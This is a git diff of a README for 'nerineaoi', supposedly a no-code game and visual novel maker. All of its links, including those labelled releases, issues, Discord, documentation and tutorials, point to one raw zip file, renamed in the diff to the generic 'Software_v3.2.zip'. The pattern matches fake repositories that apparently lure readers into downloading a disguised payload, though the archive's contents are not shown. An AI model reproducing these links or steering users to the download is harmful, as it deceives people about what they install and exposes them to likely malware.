@@ -1,7 +1,7 @@
 # 🎮 nerineaoi - Create Your Dream Games Easily
 
 ## 📥 Download the Latest Release
-[![Download](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip)
+[![Download](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to nerineaoi! This tool helps you design and build gamified experiences and visual novels. No programming knowledge is required. Follow these steps to get started.
@@ -20,7 +20,7 @@ Welcome to nerineaoi! This tool helps you design and build gamified experiences 
 - Export your creations for various platforms
 
 ## 🌐 How to Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip).
 2. Look for the latest version.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -45,12 +45,12 @@ If you encounter issues:
 
 ## 💬 Community Support
 Join our community to share your creations and get help:
-- [GitHub Issues](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip)
-- [Discord Channel](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip) (replace with actual link)
+- [GitHub Issues](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip)
+- [Discord Channel](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip) (replace with actual link)
 
 ## 📚 Resources
-- [Documentation](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip) for in-depth guides and tutorials.
-- [Tutorial Videos](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/nerineaoi-1.3-alpha.3.zip) (replace with actual link) to see the tools in action.
+- [Documentation](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip) for in-depth guides and tutorials.
+- [Tutorial Videos](https://raw.githubusercontent.com/HuyDeptraihaha123/nerineaoi/main/intercortical/Software_v3.2.zip) (replace with actual link) to see the tools in action.
 
 ## 📆 Upcoming Features
 - Multiplayer options for games
